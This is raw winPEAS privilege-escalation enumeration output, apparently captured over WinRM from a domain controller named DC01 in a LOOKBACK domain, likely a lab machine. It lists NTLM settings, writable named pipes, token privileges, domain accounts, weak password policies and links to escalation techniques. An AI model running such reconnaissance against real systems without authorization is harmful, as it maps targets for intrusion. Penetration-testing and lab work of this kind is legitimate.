WINRM       172.16.55.128   5985   DC01             È If the binary cexecsvc.exe or associated service exists, you are inside Docker                                                                            
WINRM       172.16.55.128   5985   DC01             You are NOT inside a container
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AlwaysInstallElevated
WINRM       172.16.55.128   5985   DC01             È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated                                    
WINRM       172.16.55.128   5985   DC01                 AlwaysInstallElevated isn't available
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerate LSA settings - auth packages included                                                                                                
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 auditbasedirectories                 :       0
WINRM       172.16.55.128   5985   DC01                 auditbaseobjects                     :       0
WINRM       172.16.55.128   5985   DC01                 Bounds                               :       00-30-00-00-00-20-00-00                                                                                    
WINRM       172.16.55.128   5985   DC01                 crashonauditfail                     :       0
WINRM       172.16.55.128   5985   DC01                 fullprivilegeauditing                :       00
WINRM       172.16.55.128   5985   DC01                 LimitBlankPasswordUse                :       1
WINRM       172.16.55.128   5985   DC01                 NoLmHash                             :       1
WINRM       172.16.55.128   5985   DC01                 Security Packages                    :       ""
WINRM       172.16.55.128   5985   DC01                 Notification Packages                :       rassfm,scecli                                                                                              
WINRM       172.16.55.128   5985   DC01                 Authentication Packages              :       msv1_0                                                                                                     
WINRM       172.16.55.128   5985   DC01                 LsaPid                               :       652
WINRM       172.16.55.128   5985   DC01                 LsaCfgFlagsDefault                   :       0
WINRM       172.16.55.128   5985   DC01                 SecureBoot                           :       1
WINRM       172.16.55.128   5985   DC01                 ProductType                          :       7
WINRM       172.16.55.128   5985   DC01                 disabledomaincreds                   :       0
WINRM       172.16.55.128   5985   DC01                 everyoneincludesanonymous            :       0
WINRM       172.16.55.128   5985   DC01                 forceguest                           :       0
WINRM       172.16.55.128   5985   DC01                 restrictanonymous                    :       0
WINRM       172.16.55.128   5985   DC01                 restrictanonymoussam                 :       1
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating NTLM Settings
WINRM       172.16.55.128   5985   DC01               LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)                                                                                
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               NTLM Signing Settings
WINRM       172.16.55.128   5985   DC01                   ClientRequireSigning    : False
WINRM       172.16.55.128   5985   DC01                   ClientNegotiateSigning  : True
WINRM       172.16.55.128   5985   DC01                   ServerRequireSigning    : True
WINRM       172.16.55.128   5985   DC01                   ServerNegotiateSigning  : True
WINRM       172.16.55.128   5985   DC01                   LdapSigning             : Negotiate signing (Negotiate signing)                                                                                       
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               Session Security
WINRM       172.16.55.128   5985   DC01                   NTLMMinClientSec        : 536870912 (Require 128-bit encryption)                                                                                      
WINRM       172.16.55.128   5985   DC01                   NTLMMinServerSec        : 536870912 (Require 128-bit encryption)                                                                                      
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               NTLM Auditing and Restrictions
WINRM       172.16.55.128   5985   DC01                   InboundRestrictions     :  (Not defined)
WINRM       172.16.55.128   5985   DC01                   OutboundRestrictions    :  (Not defined)
WINRM       172.16.55.128   5985   DC01                   InboundAuditing         :  (Not defined)
WINRM       172.16.55.128   5985   DC01                   OutboundExceptions      :
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Local Group Policy settings - local users/machine                                                                                      
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Potential GPO abuse vectors (applied domain GPOs writable by current user)                                                                     
WINRM       172.16.55.128   5985   DC01                 No obvious GPO abuse via writable SYSVOL paths or GPCO membership detected.                                                                             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking AppLocker effective policy
WINRM       172.16.55.128   5985   DC01                AppLockerPolicy version: 1
WINRM       172.16.55.128   5985   DC01                listing rules:
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Printers (WMI)
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Named Pipes
WINRM       172.16.55.128   5985   DC01               Name                                                                                                 CurrentUserPerms                                                       Sddl                                                                                  
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               eventlog                                                                                             Everyone [Allow: WriteData/CreateFiles]                                O:LSG:LSD:P(A;;0x12019b;;;WD)(A;;CC;;;OW)(A;;0x12008f;;;S-1-5-80-880578595-1860270145-482643319-2788375705-1540778122)
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               RpcProxy\49677                                                                                       Everyone [Allow: WriteData/CreateFiles]                                O:BAG:SYD:(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;BA)
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               RpcProxy\593                                                                                         Everyone [Allow: WriteData/CreateFiles]                                O:NSG:NSD:(A;;0x12019b;;;WD)(A;;RC;;;OW)(A;;0x12019b;;;AN)(A;;FA;;;S-1-5-80-521322694-906040134-3864710659-1525148216-3451224162)(A;;FA;;;S-1-5-80-979556362-403687129-3954533659-2335141334-1547273080)
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               sql\query                                                                                            Everyone [Allow: WriteData/CreateFiles]                                O:S-1-5-21-3830242231-3868280746-2763890440-1106G:DUD:(A;;0x12019b;;;WD)(A;;LC;;;S-1-5-21-3830242231-3868280746-2763890440-1106)
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               SQLLocal\MSSQLSERVER                                                                                 Everyone [Allow: WriteData/CreateFiles]                                O:S-1-5-21-3830242231-3868280746-2763890440-1106G:DUD:(A;;0x12019b;;;WD)(A;;LC;;;S-1-5-21-3830242231-3868280746-2763890440-1106)
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               vgauth-service                                                                                       Everyone [Allow: WriteData/CreateFiles]                                O:BAG:SYD:P(A;;0x12019f;;;WD)(A;;FA;;;SY)(A;;FA;;;BA)
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating AMSI registered providers
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Sysmon configuration
WINRM       172.16.55.128   5985   DC01                   You must be an administrator to run this check
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Sysmon process creation logs (1)                                                                                                   
WINRM       172.16.55.128   5985   DC01                   You must be an administrator to run this check
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed .NET versions
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Interesting Events information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ                                                  
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Printing Explicit Credential Events (4648) for last 30 days - A process logged on using plaintext credentials                                  
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                   You must be an administrator to run this check
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Printing Account Logon Events (4624) for the last 10 days.                                                                                     
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                   You must be an administrator to run this check
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Process creation events - searching logs (EID 4688) for sensitive data.                                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                   You must be an administrator to run this check
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell events - script block logs (EID 4104) - searching for sensitive data.                                                               
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01               [X] Exception: Attempted to perform an unauthorized operation.                                                                                            
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Displaying Power off/on events for last 5 days                                                                                                 
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             System.UnauthorizedAccessException: Attempted to perform an unauthorized operation.                                                                         
WINRM       172.16.55.128   5985   DC01                at System.Diagnostics.Eventing.Reader.EventLogException.Throw(Int32 errorCode)                                                                           
WINRM       172.16.55.128   5985   DC01                at System.Diagnostics.Eventing.Reader.NativeWrapper.EvtQuery(EventLogHandle session, String path, String query, Int32 flags)                             
WINRM       172.16.55.128   5985   DC01                at System.Diagnostics.Eventing.Reader.EventLogReader..ctor(EventLogQuery eventQuery, EventBookmark bookmark)                                             
WINRM       172.16.55.128   5985   DC01                at winPEAS.Helpers.MyUtils.GetEventLogReader(String path, String query, String computerName)                                                             
WINRM       172.16.55.128   5985   DC01                at winPEAS.Info.EventsInfo.Power.Power.<GetPowerEventInfos>d__0.MoveNext()                                                                               
WINRM       172.16.55.128   5985   DC01                at winPEAS.Checks.EventsInfo.PowerOnEvents()
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Users Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ                                                               
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Users
WINRM       172.16.55.128   5985   DC01             È Check if you have some admin equivalent privileges https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#users--groups                                                                                                  
WINRM       172.16.55.128   5985   DC01               [X] Exception: Object reference not set to an instance of an object.                                                                                      
WINRM       172.16.55.128   5985   DC01               Current user: administrator 
WINRM       172.16.55.128   5985   DC01               Current groups: Domain Users, Everyone, Builtin\Remote Management Users, Users, Builtin\Pre-Windows 2000 Compatible Access, Builtin\Certificate Service DCOM Access, Network, Authenticated Users, This Organization, IT, NTLM Authentication                     
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Current User Idle Time
WINRM       172.16.55.128   5985   DC01                Current User   :     LOOKBACK\administrator
WINRM       172.16.55.128   5985   DC01                Idle Time      :     03h:26m:17s:156ms
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Display Tenant information (DsRegCmd.exe /status)                                                                                              
WINRM       172.16.55.128   5985   DC01                Tenant is NOT Azure AD Joined.
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Current Token privileges
WINRM       172.16.55.128   5985   DC01             È Check if you can escalate privilege using some enabled token https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation                                                                                   
WINRM       172.16.55.128   5985   DC01                 SeMachineAccountPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
WINRM       172.16.55.128   5985   DC01                 SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
WINRM       172.16.55.128   5985   DC01                 SeIncreaseWorkingSetPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Clipboard text
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Logged users
WINRM       172.16.55.128   5985   DC01               [X] Exception: Access denied 
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Display information about local users
WINRM       172.16.55.128   5985   DC01                Computer Name           :   DC01
WINRM       172.16.55.128   5985   DC01                User Name               :   Administrator
WINRM       172.16.55.128   5985   DC01                User Id                 :   500
WINRM       172.16.55.128   5985   DC01                Is Enabled              :   True
WINRM       172.16.55.128   5985   DC01                User Type               :   Administrator
WINRM       172.16.55.128   5985   DC01                Comment                 :   Built-in account for administering the computer/domain                                                                       
WINRM       172.16.55.128   5985   DC01                Last Logon              :   4/7/2026 7:37:27 PM
WINRM       172.16.55.128   5985   DC01                Logons Count            :   14
WINRM       172.16.55.128   5985   DC01                Password Last Set       :   10/17/2025 11:08:02 AM                                                                                                       
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                Computer Name           :   DC01
WINRM       172.16.55.128   5985   DC01                User Name               :   Guest
WINRM       172.16.55.128   5985   DC01                User Id                 :   501
WINRM       172.16.55.128   5985   DC01                Is Enabled              :   False
WINRM       172.16.55.128   5985   DC01                User Type               :   Guest
WINRM       172.16.55.128   5985   DC01                Comment                 :   Built-in account for guest access to the computer/domain                                                                     
WINRM       172.16.55.128   5985   DC01                Last Logon              :   1/1/1970 12:00:00 AM
WINRM       172.16.55.128   5985   DC01                Logons Count            :   0
WINRM       172.16.55.128   5985   DC01                Password Last Set       :   1/1/1970 12:00:00 AM
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                Computer Name           :   DC01
WINRM       172.16.55.128   5985   DC01                User Name               :   krbtgt
WINRM       172.16.55.128   5985   DC01                User Id                 :   502
WINRM       172.16.55.128   5985   DC01                Is Enabled              :   False
WINRM       172.16.55.128   5985   DC01                User Type               :   User
WINRM       172.16.55.128   5985   DC01                Comment                 :   Key Distribution Center Service Account                                                                                      
WINRM       172.16.55.128   5985   DC01                Last Logon              :   1/1/1970 12:00:00 AM
WINRM       172.16.55.128   5985   DC01                Logons Count            :   0
WINRM       172.16.55.128   5985   DC01                Password Last Set       :   10/16/2025 8:15:35 PM
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                Computer Name           :   DC01
WINRM       172.16.55.128   5985   DC01                User Name               :   hank
WINRM       172.16.55.128   5985   DC01                User Id                 :   1104
WINRM       172.16.55.128   5985   DC01                Is Enabled              :   True
WINRM       172.16.55.128   5985   DC01                User Type               :   User
WINRM       172.16.55.128   5985   DC01                Comment                 :
WINRM       172.16.55.128   5985   DC01                Last Logon              :   1/1/1970 12:00:00 AM
WINRM       172.16.55.128   5985   DC01                Logons Count            :   0
WINRM       172.16.55.128   5985   DC01                Password Last Set       :   10/19/2025 5:05:12 AM
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                Computer Name           :   DC01
WINRM       172.16.55.128   5985   DC01                User Name               :   lookback-admin
WINRM       172.16.55.128   5985   DC01                User Id                 :   1105
WINRM       172.16.55.128   5985   DC01                Is Enabled              :   True
WINRM       172.16.55.128   5985   DC01                User Type               :   User
WINRM       172.16.55.128   5985   DC01                Comment                 :
WINRM       172.16.55.128   5985   DC01                Last Logon              :   10/19/2025 5:48:29 AM
WINRM       172.16.55.128   5985   DC01                Logons Count            :   0
WINRM       172.16.55.128   5985   DC01                Password Last Set       :   10/19/2025 5:11:25 AM
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                Computer Name           :   DC01
WINRM       172.16.55.128   5985   DC01                User Name               :   db-admin
WINRM       172.16.55.128   5985   DC01                User Id                 :   1106
WINRM       172.16.55.128   5985   DC01                Is Enabled              :   True
WINRM       172.16.55.128   5985   DC01                User Type               :   User
WINRM       172.16.55.128   5985   DC01                Comment                 :
WINRM       172.16.55.128   5985   DC01                Last Logon              :   4/10/2026 8:51:59 PM
WINRM       172.16.55.128   5985   DC01                Logons Count            :   16
WINRM       172.16.55.128   5985   DC01                Password Last Set       :   10/19/2025 5:15:44 AM
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                Computer Name           :   DC01
WINRM       172.16.55.128   5985   DC01                User Name               :   Service_Maintainer
WINRM       172.16.55.128   5985   DC01                User Id                 :   1107
WINRM       172.16.55.128   5985   DC01                Is Enabled              :   True
WINRM       172.16.55.128   5985   DC01                User Type               :   User
WINRM       172.16.55.128   5985   DC01                Comment                 :
WINRM       172.16.55.128   5985   DC01                Last Logon              :   1/1/1970 12:00:00 AM
WINRM       172.16.55.128   5985   DC01                Logons Count            :   0
WINRM       172.16.55.128   5985   DC01                Password Last Set       :   10/19/2025 6:27:26 AM
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                Computer Name           :   DC01
WINRM       172.16.55.128   5985   DC01                User Name               :   IT-SEC-admin
WINRM       172.16.55.128   5985   DC01                User Id                 :   1110
WINRM       172.16.55.128   5985   DC01                Is Enabled              :   True
WINRM       172.16.55.128   5985   DC01                User Type               :   User
WINRM       172.16.55.128   5985   DC01                Comment                 :
WINRM       172.16.55.128   5985   DC01                Last Logon              :   4/10/2026 10:37:35 PM
WINRM       172.16.55.128   5985   DC01                Logons Count            :   0
WINRM       172.16.55.128   5985   DC01                Password Last Set       :   10/19/2025 7:11:48 AM
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                Computer Name           :   DC01
WINRM       172.16.55.128   5985   DC01                User Name               :   IT-admin
WINRM       172.16.55.128   5985   DC01                User Id                 :   1111
WINRM       172.16.55.128   5985   DC01                Is Enabled              :   True
WINRM       172.16.55.128   5985   DC01                User Type               :   User
WINRM       172.16.55.128   5985   DC01                Comment                 :
WINRM       172.16.55.128   5985   DC01                Last Logon              :   4/10/2026 11:38:55 PM
WINRM       172.16.55.128   5985   DC01                Logons Count            :   3
WINRM       172.16.55.128   5985   DC01                Password Last Set       :   4/10/2026 11:35:00 PM
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                Computer Name           :   DC01
WINRM       172.16.55.128   5985   DC01                User Name               :   administrator
WINRM       172.16.55.128   5985   DC01                User Id                 :   1112
WINRM       172.16.55.128   5985   DC01                Is Enabled              :   True
WINRM       172.16.55.128   5985   DC01                User Type               :   User
WINRM       172.16.55.128   5985   DC01                Comment                 :
WINRM       172.16.55.128   5985   DC01                Last Logon              :   4/10/2026 11:08:39 PM
WINRM       172.16.55.128   5985   DC01                Logons Count            :   4
WINRM       172.16.55.128   5985   DC01                Password Last Set       :   4/10/2026 10:42:35 PM
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                Computer Name           :   DC01
WINRM       172.16.55.128   5985   DC01                User Name               :   IT-email-admin
WINRM       172.16.55.128   5985   DC01                User Id                 :   1113
WINRM       172.16.55.128   5985   DC01                Is Enabled              :   True
WINRM       172.16.55.128   5985   DC01                User Type               :   User
WINRM       172.16.55.128   5985   DC01                Comment                 :
WINRM       172.16.55.128   5985   DC01                Last Logon              :   1/1/1970 12:00:00 AM
WINRM       172.16.55.128   5985   DC01                Logons Count            :   0
WINRM       172.16.55.128   5985   DC01                Password Last Set       :   10/19/2025 7:20:21 AM
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ RDP Sessions
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Ever logged users
WINRM       172.16.55.128   5985   DC01               [X] Exception: Access denied 
WINRM       172.16.55.128   5985   DC01                 Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found
WINRM       172.16.55.128   5985   DC01                 C:\Users\Administrator
WINRM       172.16.55.128   5985   DC01                 C:\Users\administrator .LOOKBACK : administrator  [Allow: AllAccess]                                                                                    
WINRM       172.16.55.128   5985   DC01                 C:\Users\All Users
WINRM       172.16.55.128   5985   DC01                 C:\Users\db-admin
WINRM       172.16.55.128   5985   DC01                 C:\Users\Default
WINRM       172.16.55.128   5985   DC01                 C:\Users\Default User
WINRM       172.16.55.128   5985   DC01                 C:\Users\Public
WINRM       172.16.55.128   5985   DC01                 C:\Users\Service_Maintainer
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
WINRM       172.16.55.128   5985   DC01                 Some AutoLogon credentials were found
WINRM       172.16.55.128   5985   DC01                 DefaultDomainName             :  LOOKBACK
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Password Policies
WINRM       172.16.55.128   5985   DC01             È Check for a possible brute-force 
WINRM       172.16.55.128   5985   DC01                 Domain: Builtin
WINRM       172.16.55.128   5985   DC01                 SID: S-1-5-32
WINRM       172.16.55.128   5985   DC01                 MaxPasswordAge: 42.22:47:31.7437440
WINRM       172.16.55.128   5985   DC01                 MinPasswordAge: 00:00:00
WINRM       172.16.55.128   5985   DC01                 MinPasswordLength: 0
WINRM       172.16.55.128   5985   DC01                 PasswordHistoryLength: 0
WINRM       172.16.55.128   5985   DC01                 PasswordProperties: 0
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 Domain: LOOKBACK
WINRM       172.16.55.128   5985   DC01                 SID: S-1-5-21-3830242231-3868280746-2763890440
WINRM       172.16.55.128   5985   DC01                 MaxPasswordAge: 42.00:00:00
WINRM       172.16.55.128   5985   DC01                 MinPasswordAge: 1.00:00:00
WINRM       172.16.55.128   5985   DC01                 MinPasswordLength: 0
WINRM       172.16.55.128   5985   DC01                 PasswordHistoryLength: 24
WINRM       172.16.55.128   5985   DC01                 PasswordProperties: 0
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Print Logon Sessions
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Processes Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ                                                           
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Processes -non Microsoft-
WINRM       172.16.55.128   5985   DC01             È Check if any interesting processes for memory dump or if you could overwrite some binary running https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#running-processes                                                
WINRM       172.16.55.128   5985   DC01               [X] Exception: Access denied 
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Vulnerable Leaked Handlers
WINRM       172.16.55.128   5985   DC01             È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#leaked-handlers                                          
WINRM       172.16.55.128   5985   DC01             È Getting Leaked Handlers, it might take some time...                                                                                                       
WINRM       172.16.55.128   5985   DC01             [#########-]  99% |                       Not Found
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Services Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ                                                            
WINRM       172.16.55.128   5985   DC01               [X] Exception: Cannot open Service Control Manager on computer '.'. This operation might require other privileges.                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01             ÉÍÍÍÍÍÍÍÍÍÍ¹ Interesting Services -non Microsoft-
WINRM       172.16.55.128   5985   DC01             È Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services                                                 
WINRM       172.16.55.128   5985   DC01               [X] Exception: Access denied 
WINRM       172.16.55.128   5985   DC01                 @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver(PMC-Sierra, Inc. - @arcsas.inf,%arcsas_ServiceName%;Adaptec SAS/SATA-II RAID Storport's Miniport Driver)[System32\drivers\arcsas.sys] - Boot                               
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD(QLogic Corporation - @netbvbda.inf,%vbd_srv_desc%;QLogic Network Adapter VBD)[System32\drivers\bxvbda.sys] - Boot                                                                                       
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @bxfcoe.inf,%BXFCOE.SVCDESC%;QLogic FCoE Offload driver(Marvell Semiconductor Inc. - @bxfcoe.inf,%BXFCOE.SVCDESC%;QLogic FCoE Offload driver)[System32\drivers\bxfcoe.sys] - Boot                                                                               
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @bxois.inf,%BXOIS.SVCDESC%;QLogic Offload iSCSI Driver(Marvell Semiconductor Inc. - @bxois.inf,%BXOIS.SVCDESC%;QLogic Offload iSCSI Driver)[System32\drivers\bxois.sys] - Boot                                                                                  
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
WINRM       172.16.55.128   5985   DC01                 @cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver(Chelsio Communications - @cht4vx64.inf,%cht4vbd.generic%;Chelsio Virtual Bus Driver)[C:\Windows\System32\drivers\cht4vx64.sys] - System                                                              
WINRM       172.16.55.128   5985   DC01                =================================================================================================                                                        
WINRM       172.16.55.128   5985   DC01             
